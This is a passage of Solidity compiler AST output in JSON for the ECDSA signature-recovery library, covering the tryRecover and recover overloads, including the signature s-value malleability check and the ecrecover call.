255"},"value":"255"},"src":"4602:18:4","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1771,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"4601:20:4","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"3237","id":1772,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4624:2:4","typeDescriptions":{"typeIdentifier":"t_rational_27_by_1","typeString":"int_const 27"},"value":"27"},"src":"4601:25:4","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1764,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4595:5:4","typeDescriptions":{"typeIdentifier":"t_type$_t_uint8_$","typeString":"type(uint8)"},"typeName":{"id":1763,"name":"uint8","nodeType":"ElementaryTypeName","src":"4595:5:4","typeDescriptions":{}}},"id":1774,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4595:32:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"VariableDeclarationStatement","src":"4585:42:4"},{"expression":{"arguments":[{"id":1777,"name":"hash","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1738,"src":"4659:4:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1778,"name":"v","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1762,"src":"4665:1:4","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},{"id":1779,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1740,"src":"4668:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1780,"name":"s","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1753,"src":"4671:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_uint8","typeString":"uint8"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1776,"name":"tryRecover","nodeType":"Identifier","overloadedDeclarations":[1705,1785,1893],"referencedDeclaration":1893,"src":"4648:10:4","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes32_$_t_uint8_$_t_bytes32_$_t_bytes32_$returns$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"function (bytes32,uint8,bytes32,bytes32) pure returns (address,enum ECDSA.RecoverError,bytes32)"}},"id":1781,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4648:25:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"tuple(address,enum ECDSA.RecoverError,bytes32)"}},"functionReturnParameters":1751,"id":1782,"nodeType":"Return","src":"4641:32:4"}]}]},"documentation":{"id":1736,"nodeType":"StructuredDocumentation","src":"3975:205:4","text":" @dev Overload of {ECDSA-tryRecover} that receives the `r` and `vs` short-signature fields separately.\n See https://eips.ethereum.org/EIPS/eip-2098[ERC-2098 short signatures]"},"id":1785,"implemented":true,"kind":"function","modifiers":[],"name":"tryRecover","nameLocation":"4194:10:4","nodeType":"FunctionDefinition","parameters":{"id":1743,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1738,"mutability":"mutable","name":"hash","nameLocation":"4222:4:4","nodeType":"VariableDeclaration","scope":1785,"src":"4214:12:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1737,"name":"bytes32","nodeType":"ElementaryTypeName","src":"4214:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":1740,"mutability":"mutable","name":"r","nameLocation":"4244:1:4","nodeType":"VariableDeclaration","scope":1785,"src":"4236:9:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1739,"name":"bytes32","nodeType":"ElementaryTypeName","src":"4236:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":1742,"mutability":"mutable","name":"vs","nameLocation":"4263:2:4","nodeType":"VariableDeclaration","scope":1785,"src":"4255:10:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1741,"name":"bytes32","nodeType":"ElementaryTypeName","src":"4255:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"4204:67:4"},"returnParameters":{"id":1751,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1745,"mutability":"mutable","name":"recovered","nameLocation":"4303:9:4","nodeType":"VariableDeclaration","scope":1785,"src":"4295:17:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1744,"name":"address","nodeType":"ElementaryTypeName","src":"4295:7:4","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1748,"mutability":"mutable","name":"err","nameLocation":"4327:3:4","nodeType":"VariableDeclaration","scope":1785,"src":"4314:16:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"typeName":{"id":1747,"nodeType":"UserDefinedTypeName","pathNode":{"id":1746,"name":"RecoverError","nameLocations":["4314:12:4"],"nodeType":"IdentifierPath","referencedDeclaration":1639,"src":"4314:12:4"},"referencedDeclaration":1639,"src":"4314:12:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"visibility":"internal"},{"constant":false,"id":1750,"mutability":"mutable","name":"errArg","nameLocation":"4340:6:4","nodeType":"VariableDeclaration","scope":1785,"src":"4332:14:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1749,"name":"bytes32","nodeType":"ElementaryTypeName","src":"4332:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"4294:53:4"},"scope":1979,"src":"4185:505:4","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1817,"nodeType":"Block","src":"4903:164:4","statements":[{"assignments":[1798,1801,1803],"declarations":[{"constant":false,"id":1798,"mutability":"mutable","name":"recovered","nameLocation":"4922:9:4","nodeType":"VariableDeclaration","scope":1817,"src":"4914:17:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1797,"name":"address","nodeType":"ElementaryTypeName","src":"4914:7:4","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1801,"mutability":"mutable","name":"error","nameLocation":"4946:5:4","nodeType":"VariableDeclaration","scope":1817,"src":"4933:18:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"typeName":{"id":1800,"nodeType":"UserDefinedTypeName","pathNode":{"id":1799,"name":"RecoverError","nameLocations":["4933:12:4"],"nodeType":"IdentifierPath","referencedDeclaration":1639,"src":"4933:12:4"},"referencedDeclaration":1639,"src":"4933:12:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"visibility":"internal"},{"constant":false,"id":1803,"mutability":"mutable","name":"errorArg","nameLocation":"4961:8:4","nodeType":"VariableDeclaration","scope":1817,"src":"4953:16:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1802,"name":"bytes32","nodeType":"ElementaryTypeName","src":"4953:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"id":1809,"initialValue":{"arguments":[{"id":1805,"name":"hash","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1788,"src":"4984:4:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1806,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1790,"src":"4990:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1807,"name":"vs","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1792,"src":"4993:2:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1804,"name":"tryRecover","nodeType":"Identifier","overloadedDeclarations":[1705,1785,1893],"referencedDeclaration":1785,"src":"4973:10:4","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes32_$_t_bytes32_$_t_bytes32_$returns$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"function (bytes32,bytes32,bytes32) pure returns (address,enum ECDSA.RecoverError,bytes32)"}},"id":1808,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4973:23:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"tuple(address,enum ECDSA.RecoverError,bytes32)"}},"nodeType":"VariableDeclarationStatement","src":"4913:83:4"},{"expression":{"arguments":[{"id":1811,"name":"error","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1801,"src":"5018:5:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},{"id":1812,"name":"errorArg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1803,"src":"5025:8:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1810,"name":"_throwError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1978,"src":"5006:11:4","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_enum$_RecoverError_$1639_$_t_bytes32_$returns$__$","typeString":"function (enum ECDSA.RecoverError,bytes32) pure"}},"id":1813,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5006:28:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1814,"nodeType":"ExpressionStatement","src":"5006:28:4"},{"expression":{"id":1815,"name":"recovered","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1798,"src":"5051:9:4","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":1796,"id":1816,"nodeType":"Return","src":"5044:16:4"}]},"documentation":{"id":1786,"nodeType":"StructuredDocumentation","src":"4696:116:4","text":" @dev Overload of {ECDSA-recover} that receives the `r and `vs` short-signature fields separately."},"id":1818,"implemented":true,"kind":"function","modifiers":[],"name":"recover","nameLocation":"4826:7:4","nodeType":"FunctionDefinition","parameters":{"id":1793,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1788,"mutability":"mutable","name":"hash","nameLocation":"4842:4:4","nodeType":"VariableDeclaration","scope":1818,"src":"4834:12:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1787,"name":"bytes32","nodeType":"ElementaryTypeName","src":"4834:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":1790,"mutability":"mutable","name":"r","nameLocation":"4856:1:4","nodeType":"VariableDeclaration","scope":1818,"src":"4848:9:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1789,"name":"bytes32","nodeType":"ElementaryTypeName","src":"4848:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":1792,"mutability":"mutable","name":"vs","nameLocation":"4867:2:4","nodeType":"VariableDeclaration","scope":1818,"src":"4859:10:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1791,"name":"bytes32","nodeType":"ElementaryTypeName","src":"4859:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"4833:37:4"},"returnParameters":{"id":1796,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1795,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1818,"src":"4894:7:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1794,"name":"address","nodeType":"ElementaryTypeName","src":"4894:7:4","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"4893:9:4"},"scope":1979,"src":"4817:250:4","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1892,"nodeType":"Block","src":"5382:1372:4","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1842,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":1839,"name":"s","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1827,"src":"6278:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1838,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6270:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":1837,"name":"uint256","nodeType":"ElementaryTypeName","src":"6270:7:4","typeDescriptions":{}}},"id":1840,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6270:10:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"307837464646464646464646464646464646464646464646464646464646464646463544353736453733353741343530314444464539324634363638314232304130","id":1841,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6283:66:4","typeDescriptions":{"typeIdentifier":"t_rational_57896044618658097711785492504343953926418782139537452191302581570759080747168_by_1","typeString":"int_const 5789...(69 digits omitted)...7168"},"value":"0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0"},"src":"6270:79:4","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1853,"nodeType":"IfStatement","src":"6266:164:4","trueBody":{"id":1852,"nodeType":"Block","src":"6351:79:4","statements":[{"expression":{"components":[{"arguments":[{"hexValue":"30","id":1845,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6381:1:4","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":1844,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6373:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1843,"name":"address","nodeType":"ElementaryTypeName","src":"6373:7:4","typeDescriptions":{}}},"id":1846,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6373:10:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"expression":{"id":1847,"name":"RecoverError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1639,"src":"6385:12:4","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_RecoverError_$1639_$","typeString":"type(enum ECDSA.RecoverError)"}},"id":1848,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"6398:17:4","memberName":"InvalidSignatureS","nodeType":"MemberAccess","referencedDeclaration":1638,"src":"6385:30:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},{"id":1849,"name":"s","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1827,"src":"6417:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"id":1850,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"6372:47:4","typeDescriptions":{"typeIdentifier":"t_tuple$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"tuple(address,enum ECDSA.RecoverError,bytes32)"}},"functionReturnParameters":1836,"id":1851,"nodeType":"Return","src":"6365:54:4"}]}},{"assignments":[1855],"declarations":[{"constant":false,"id":1855,"mutability":"mutable","name":"signer","nameLocation":"6532:6:4","nodeType":"VariableDeclaration","scope":1892,"src":"6524:14:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1854,"name":"address","nodeType":"ElementaryTypeName","src":"6524:7:4","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":1862,"initialValue":{"arguments":[{"id":1857,"name":"hash","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1821,"src":"6551:4:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1858,"name":"v","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1823,"src":"6557:1:4","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},{"id":1859,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1825,"src":"6560:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1860,"name":"s","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1827,"src":"6563:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_uint8","typeString":"uint8"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1856,"name":"ecrecover","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-6,"src":"6541:9:4","typeDescriptions":{"typeIdentifier":"t_function_ecrecover_pure$_t_bytes32_$_t_uint8_$_t_bytes32_$_t_bytes32_$returns$_t_address_$","typeString":"function (bytes32,uint8,bytes32,bytes32) pure returns (address)"}},"id":1861,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6541:24:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"6524:41:4"},{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":1868,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1863,"name":"signer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1855,"src":"6579:6:4","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":1866,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6597:1:4","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":1865,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6589:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1864,"name":"address","nodeType":"ElementaryTypeName","src":"6589:7:4","typeDescriptions":{}}},"id":1867,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6589:10:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"6579:20:4","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1882,"nodeType":"IfStatement","src":"6575:113:4","trueBody":{"id":1881,"nodeType":"Block","src":"6601:87:4","statements":[{"expression":{"components":[{"arguments":[{"hexValue":"30","id":1871,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6631:1:4","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":1870,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6623:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1869,"name":"address","nodeType":"ElementaryTypeName","src":"6623:7:4","typeDescriptions":{}}},"id":1872,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6623:10:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"expression":{"id":1873,"name":"RecoverError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1639,"src":"6635:12:4","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_RecoverError_$1639_$","typeString":"type(enum ECDSA.RecoverError)"}},"id":1874,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"6648:16:4","memberName":"InvalidSignature","nodeType":"MemberAccess","referencedDeclaration":1636,"src":"6635:29:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},{"arguments":[{"hexValue":"30","id":1877,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6674:1:4","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":1876,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6666:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes32_$","typeString":"type(bytes32)"},"typeName":{"id":1875,"name":"bytes32","nodeType":"ElementaryTypeName","src":"6666:7:4","typeDescriptions":{}}},"id":1878,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6666:10:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"id":1879,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"6622:55:4","typeDescriptions":{"typeIdentifier":"t_tuple$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"tuple(address,enum ECDSA.RecoverError,bytes32)"}},"functionReturnParameters":1836,"id":1880,"nodeType":"Return","src":"6615:62:4"}]}},{"expression":{"components":[{"id":1883,"name":"signer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1855,"src":"6706:6:4","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"expression":{"id":1884,"name":"RecoverError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1639,"src":"6714:12:4","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_RecoverError_$1639_$","typeString":"type(enum ECDSA.RecoverError)"}},"id":1885,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"6727:7:4","memberName":"NoError","nodeType":"MemberAccess","referencedDeclaration":1635,"src":"6714:20:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},{"arguments":[{"hexValue":"30","id":1888,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6744:1:4","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":1887,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6736:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes32_$","typeString":"type(bytes32)"},"typeName":{"id":1886,"name":"bytes32","nodeType":"ElementaryTypeName","src":"6736:7:4","typeDescriptions":{}}},"id":1889,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6736:10:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"id":1890,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"6705:42:4","typeDescriptions":{"typeIdentifier":"t_tuple$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"tuple(address,enum ECDSA.RecoverError,bytes32)"}},"functionReturnParameters":1836,"id":1891,"nodeType":"Return","src":"6698:49:4"}]},"documentation":{"id":1819,"nodeType":"StructuredDocumentation","src":"5073:125:4","text":" @dev Overload of {ECDSA-tryRecover} that receives the `v`,\n `r` and `s` signature fields separately."},"id":1893,"implemented":true,"kind":"function","modifiers":[],"name":"tryRecover","nameLocation":"5212:10:4","nodeType":"FunctionDefinition","parameters":{"id":1828,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1821,"mutability":"mutable","name":"hash","nameLocation":"5240:4:4","nodeType":"VariableDeclaration","scope":1893,"src":"5232:12:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1820,"name":"bytes32","nodeType":"ElementaryTypeName","src":"5232:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":1823,"mutability":"mutable","name":"v","nameLocation":"5260:1:4","nodeType":"VariableDeclaration","scope":1893,"src":"5254:7:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":1822,"name":"uint8","nodeType":"ElementaryTypeName","src":"5254:5:4","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"},{"constant":false,"id":1825,"mutability":"mutable","name":"r","nameLocation":"5279:1:4","nodeType":"VariableDeclaration","scope":1893,"src":"5271:9:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1824,"name":"bytes32","nodeType":"ElementaryTypeName","src":"5271:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":1827,"mutability":"mutable","name":"s","nameLocation":"5298:1:4","nodeType":"VariableDeclaration","scope":1893,"src":"5290:9:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1826,"name":"bytes32","nodeType":"ElementaryTypeName","src":"5290:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"5222:83:4"},"returnParameters":{"id":1836,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1830,"mutability":"mutable","name":"recovered","nameLocation":"5337:9:4","nodeType":"VariableDeclaration","scope":1893,"src":"5329:17:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1829,"name":"address","nodeType":"ElementaryTypeName","src":"5329:7:4","stateMutability":"nonpayab